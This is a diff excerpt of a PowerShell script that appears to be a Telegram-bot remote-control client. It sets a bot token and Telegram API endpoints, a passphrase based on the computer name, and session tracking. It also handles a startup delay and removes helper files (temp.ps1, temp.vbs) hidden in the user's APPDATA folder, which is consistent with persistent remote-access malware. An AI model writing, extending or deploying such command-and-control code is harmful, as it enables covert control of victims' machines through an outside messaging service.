@@ -17,13 +17,13 @@ $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token
 #-----------------------------------------------------------------------------------------------------------
 
 # Define Connection Variables
-$PassPhrase = "$env:COMPUTERNAME"
+$PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
+$global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $URL='https://api.telegram.org/bot{0}' -f $Token
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
-$global:errormsg = 0 # 1 = return error messages (off by default)
 
 # Emoji characters
 $tick = [char]::ConvertFromUtf32(0x2705)
@@ -35,8 +35,7 @@ $cmde = [char]::ConvertFromUtf32(0x1F517)
 $pause = [char]::ConvertFromUtf32(0x23F8)
 
 # Startup Delay
-if(Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){Sleep 15}
-Sleep 5
+Sleep 10
 # remove pause files
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
